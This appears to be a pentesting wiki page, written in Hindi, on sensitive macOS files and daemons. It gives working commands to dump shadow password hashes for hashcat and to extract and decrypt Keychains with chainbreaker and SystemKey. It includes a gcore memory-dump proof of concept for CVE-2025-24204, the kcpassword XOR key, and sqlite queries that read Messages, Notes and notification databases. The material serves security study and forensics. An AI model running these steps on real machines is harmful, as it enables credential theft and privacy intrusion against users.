# macOS की संवेदनशील जगहें और दिलचस्प Daemons

{{#include ../../../banners/hacktricks-training.md}}


## पासवर्ड

### Shadow Passwords

Shadow password उपयोगकर्ता के कॉन्फ़िगरेशन के साथ **`/var/db/dslocal/nodes/Default/users/`** में मौजूद plists में स्टोर होता है।\
निम्नलिखित oneliner का उपयोग **उपयोगकर्ताओं के बारे में सारी जानकारी** (hash info सहित) dump करने के लिए किया जा सकता है:

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**इस तरह की scripts**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**यह वाली**](https://github.com/octomagon/davegrohl.git) hash को **hashcat** **format** में बदलने के लिए इस्तेमाल की जा सकती हैं।

एक वैकल्पिक one-liner, जो hashcat format `-m 7100` (macOS PBKDF2-SHA512) में सभी non-service accounts के creds dump करेगा:

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

`dscl` का उपयोग करके किसी user का `ShadowHashData` प्राप्त करने का एक और तरीका है: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Linux पर कॉपी किए गए ShadowHashData को कन्वर्ट करना

अगर attribute को Linux cracking host पर कॉपी किया गया था, तो `shadowhash.hex` में **केवल इसके hexadecimal bytes** सेव करें (`ShadowHashData:` label नहीं)। Ubuntu पर, `libplist-utils` decoded binary plist को macOS `plutil` के बिना पढ़ने योग्य XML में कन्वर्ट करता है।<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

XML में अलग SRP verifier के बजाय **`SALTED-SHA512-PBKDF2`** से `iterations` और base64 `salt` तथा `entropy` का उपयोग करें। `salt_b64` और `entropy_b64` को उनके संबंधित XML `<data>` कंटेंट पर सेट करें। उन्हें hex में decode करके Hashcat mode `7100` के लिए एक पंक्ति इस रूप में बनाएँ: `$ml$<iterations>$<salt_hex>$<entropy_hex>`। यह privileged hash acquisition के बाद की offline guessing है, initial-access या privilege-escalation method नहीं।<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

यह फ़ाइल **केवल तभी इस्तेमाल होती है** जब सिस्टम **single-user mode** में चल रहा हो (इसलिए इसका इस्तेमाल बहुत कम होता है)।

### Keychain Dump

ध्यान दें कि decrypted passwords को **dump** करने के लिए `security` binary का इस्तेमाल करने पर, user से इस operation की अनुमति देने के लिए कई prompts दिखेंगे।

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

आधुनिक macOS पर सबसे दिलचस्प backing stores आमतौर पर **`~/Library/Keychains/login.keychain-db`** और **`/Library/Keychains/System.keychain`** होते हैं। ये SQLite-backed फ़ाइलें हैं, लेकिन plaintext access अब भी **`securityd`** के ज़रिए brokered होता है: raw DB चुराने से मुख्यतः metadata और encrypted blobs ही मिलते हैं, जब तक कि आप उपयोगकर्ता का password, `SystemKey` या memory में मौजूद master key भी recover न कर लें।<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> इस comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) के आधार पर लगता है कि ये tools अब Big Sur में काम नहीं करते।

### Keychaindump का अवलोकन

macOS keychains से passwords निकालने के लिए **keychaindump** नाम का एक tool बनाया गया है, लेकिन [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) के अनुसार, Big Sur जैसे नए macOS versions पर इसकी सीमाएँ हैं। **keychaindump** का उपयोग करने के लिए attacker को access हासिल करके privileges को **root** तक escalate करना पड़ता है। यह tool इस तथ्य का फ़ायदा उठाता है कि सुविधा के लिए, user के login करते ही keychain default रूप से unlocked हो जाता है, जिससे applications को बार-बार user का password माँगे बिना उस तक access मिल सकता है। हालांकि, अगर user हर बार इस्तेमाल के बाद अपना keychain lock करने का विकल्प चुनता है, तो **keychaindump** अप्रभावी हो जाता है।

**Keychaindump**, **securityd** नाम की एक विशिष्ट process को target करके काम करता है। Apple के अनुसार, यह authorization और cryptographic operations के लिए एक daemon है और keychain तक access के लिए महत्वपूर्ण है। Extraction process में user के login password से निकली **Master Key** को ढूँढ़ना शामिल है। Keychain फ़ाइल पढ़ने के लिए यह key ज़रूरी है। **Master Key** ढूँढ़ने के लिए, **keychaindump** `vmmap` command का उपयोग करके **securityd** के memory heap को scan करता है और `MALLOC_TINY` के रूप में flagged क्षेत्रों में संभावित keys खोजता है। इन memory locations का निरीक्षण करने के लिए यह command इस्तेमाल की जाती है:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

संभावित master keys की पहचान करने के बाद, **keychaindump** heaps में एक खास pattern (`0x0000000000000018`) खोजता है, जो master key के संभावित उम्मीदवार को दर्शाता है। इस key का उपयोग करने के लिए deobfuscation सहित आगे के चरणों की ज़रूरत होती है, जैसा कि **keychaindump** के source code में बताया गया है। इस क्षेत्र पर ध्यान केंद्रित करने वाले analysts को ध्यान रखना चाहिए कि keychain को decrypt करने के लिए ज़रूरी डेटा **securityd** process की memory में संग्रहित होता है। **keychaindump** चलाने के लिए एक उदाहरण command है:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) macOS keychain से निम्न प्रकार की जानकारी फॉरेंसिक रूप से विश्वसनीय तरीके से निकाल सकता है:

- Hashed Keychain password, जिसे [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) से crack किया जा सकता है
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) से प्राप्त master key, या SystemKey जैसी unlock file देने पर Chainbreaker plaintext passwords भी प्रदान करेगा।

Keychain को unlock करने के इन तरीकों में से किसी का उपयोग किए बिना, Chainbreaker अन्य सभी उपलब्ध जानकारी दिखाएगा।

#### **Keychain keys डंप करें**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **पासवर्ड सहित keychain keys को SystemKey के जरिए Dump करें**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **keychain keys को dump करना (passwords के साथ), hash को crack करना**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **memory dump के साथ Keychain keys (पासवर्ड सहित) dump करें**

**memory dump** करने के लिए [इन चरणों का पालन करें](../index.html#dumping-memory-with-osxpmem)

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **users के password का उपयोग करके keychain keys (passwords सहित) dump करें**

अगर आपको users का password पता है, तो आप **उस user के keychains को dump और decrypt** कर सकते हैं।

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### `gcore` entitlement के ज़रिए Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia) में `/usr/bin/gcore` को **`com.apple.system-task-ports.read`** entitlement के साथ जारी किया गया था, इसलिए कोई भी local admin (या malicious signed app) **SIP/TCC लागू होने पर भी किसी भी process की memory dump कर सकता था**। `securityd` का dump करने से **Keychain master key** cleartext में leak हो जाती है और user password के बिना `login.keychain-db` को decrypt किया जा सकता है।<sup>[[1]](#references)</sup>

**कमज़ोर builds (15.0–15.2) पर त्वरित repro:**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
निकाली गई hex key को Chainbreaker (`--key <hex>`) में दें, ताकि login keychain को decrypt किया जा सके। Apple ने **macOS 15.3+** में entitlement हटा दिया है, इसलिए यह केवल unpatched Sequoia builds या उन systems पर काम करता है जिनमें vulnerable binary अब भी मौजूद है।

### kcpassword

**kcpassword** file में **user का login password** होता है, लेकिन केवल तभी जब system owner ने **automatic login** enabled किया हो। इसलिए user से password पूछे बिना उसे automatically log in कर दिया जाएगा (जो बहुत secure नहीं है)।

Password को **`/etc/kcpassword`** file में key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** के साथ XOR करके store किया जाता है। अगर user का password key से लंबा है, तो key दोबारा इस्तेमाल की जाती है।\
इससे password recover करना काफी आसान हो जाता है, उदाहरण के लिए [**इस script**](https://gist.github.com/opshope/32f65875d45215c3677d) का इस्तेमाल करके।

## Databases में दिलचस्प जानकारी

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

**Sequoia** से पहले, Notification Center store आमतौर पर **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** में मिलता है। **Sequoia+** में Apple ने इसे TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** में स्थानांतरित कर दिया।

ज़्यादातर दिलचस्प जानकारी **blob** columns में संग्रहीत होती है, इसलिए आपको उस content को extract करके human-readable रूप में बदलना होगा (`plutil -p -`, `strings`, या किसी छोटे parser का उपयोग करके)। Quick triage के उदाहरण:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### हालिया गोपनीयता संबंधी समस्याएँ (NotificationCenter DB)

- macOS **14.7–15.1** में Apple ने banner का content `db2/db` SQLite में उचित redaction के बिना store किया था। CVEs **CVE-2024-44292/44293/40838/54504** की वजह से कोई भी local user केवल DB खोलकर दूसरे users के notification text को पढ़ सकता था (TCC prompt के बिना)।<sup>[[3]](#references)</sup>
- Apple ने नए Sequoia builds में DB को `group.com.apple.usernoted` में ले जाकर और TCC से सुरक्षित करके इसका समाधान किया। इसलिए मौजूदा systems पर इसे पढ़ने के लिए आम तौर पर सही user context या TCC bypass की ज़रूरत होती है।<sup>[[4]](#references)</sup>
- Legacy endpoints पर, अगर आप artefacts को सुरक्षित रखना चाहते हैं, तो update या reboot करने से पहले `db`, `db-wal` और `db-shm` files को एक साथ copy करें।

### टिप्पणियाँ

Users के **notes** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में मिल सकते हैं।

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

यदि ऊपर दिया गया one-liner बहुत noisy हो, तो `ZICNOTEDATA.ZDATA` export करें, उसे gunzip करें और protobuf parse करें: आमतौर पर यह SQLite पर सीधे `strings` चलाने से ज़्यादा विश्वसनीय होता है।

### Background Tasks / Login Items

**Ventura** के बाद से, उपयोगकर्ता द्वारा स्वीकृत login items और कई background tasks को **BTM** stores में ट्रैक किया जाता है, जैसे **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** और versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**।

ये फ़ाइलें persistence, helper tools और कुछ MDM-managed background items की तुरंत पहचान करने में उपयोगी हैं:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Persistence के पहलू और BTM internals के लिए, [auto-start locations पेज](../../macos-auto-start-locations.md#login-items) और [Background Tasks Management नोट्स](../macos-security-protections/README.md#background-tasks-management) देखें।

## Preferences

macOS ऐप्स में preferences **`$HOME/Library/Preferences`** में और iOS में `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` में होती हैं।

macOS में **`defaults`** cli टूल का उपयोग **Preferences फ़ाइल को modify करने** के लिए किया जा सकता है।

**`/usr/sbin/cfprefsd`** XPC services `com.apple.cfprefsd.daemon` और `com.apple.cfprefsd.agent` को संभालता है और preferences modify करने जैसी कार्रवाइयाँ करने के लिए इसे call किया जा सकता है।

## OpenDirectory permissions.plist

फ़ाइल `/System/Library/OpenDirectory/permissions.plist` में node attributes पर लागू permissions होती हैं और यह SIP द्वारा protected है।\
यह फ़ाइल UUID (uid नहीं) के आधार पर विशिष्ट users को permissions देती है, ताकि वे `ShadowHashData`, `HeimdalSRPKey` और `KerberosKeys` जैसी संवेदनशील जानकारी को access कर सकें।

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## सिस्टम नोटिफ़िकेशन

### Darwin नोटिफ़िकेशन

नोटिफ़िकेशन के लिए मुख्य daemon **`/usr/sbin/notifyd`** है। नोटिफ़िकेशन प्राप्त करने के लिए clients को `com.apple.system.notification_center` Mach port के ज़रिए register करना होगा (इन्हें `sudo lsmp -p <pid notifyd>` से देखें)। यह daemon `/etc/notify.conf` फ़ाइल से configure किया जा सकता है।

नोटिफ़िकेशन के लिए इस्तेमाल किए जाने वाले नाम reverse DNS के अनन्य नाम होते हैं। इनमें से किसी नाम पर नोटिफ़िकेशन भेजे जाने पर, उसे संभालने में सक्षम होने का संकेत देने वाले client(s) को वह प्राप्त होगा।

`notifyd` process को SIGUSR2 signal भेजकर और बनाई गई फ़ाइल `/var/run/notifyd_<pid>.status` पढ़कर मौजूदा स्थिति (और सभी नाम) देखी जा सकती है:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

**Distributed Notification Center**, जिसका मुख्य binary **`/usr/sbin/distnoted`** है, notifications भेजने का एक और तरीका है। यह कुछ XPC services expose करता है और clients को verify करने की कोशिश के लिए कुछ checks करता है।

### Apple Push Notifications (APN)

इस मामले में, applications **topics** के लिए register कर सकते हैं। Client **`apsd`** के ज़रिए Apple के servers से संपर्क करके एक token generate करेगा।\
इसके बाद, providers भी एक token generate करेंगे और clients को messages भेजने के लिए Apple के servers से connect कर सकेंगे। ये messages स्थानीय रूप से **`apsd`** द्वारा receive किए जाएंगे, जो notification को उसका इंतज़ार कर रही application तक relay करेगा।

Preferences `/Library/Preferences/com.apple.apsd.plist` में स्थित हैं।

macOS में messages का एक local database `/Library/Application\ Support/ApplePushService/aps.db` में और iOS में `/var/mobile/Library/ApplePushService` में स्थित है। इसमें 3 tables हैं: `incoming_messages`, `outgoing_messages` और `channel`।

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

इसका उपयोग करके daemon और connections के बारे में जानकारी प्राप्त करना भी संभव है:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## User Notifications

ये वे notifications हैं जो उपयोगकर्ता को स्क्रीन पर दिखाई देनी चाहिए:

- **`CFUserNotification`**: ये API स्क्रीन पर संदेश वाला pop-up दिखाने का तरीका प्रदान करती हैं।
- **The Bulletin Board**: यह iOS में एक banner दिखाता है, जो गायब हो जाता है और Notification Center में संग्रहीत रहता है।
- **`NSUserNotificationCenter`**: macOS की legacy notification-center service। पुराने releases में, database आमतौर पर `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` में होता है; Sequoia और बाद के versions में, यह `~/Library/Group Containers/group.com.apple.usernoted/db2/db` में चला गया।

## References

- [1] [HelpNetSecurity – macOS gcore entitlement ने Keychain master key extraction की अनुमति दी (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple ने macOS Sequoia में Notification Center database से जुड़ी privacy चिंताओं का समाधान किया](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOS Password Cracking](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat example hashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
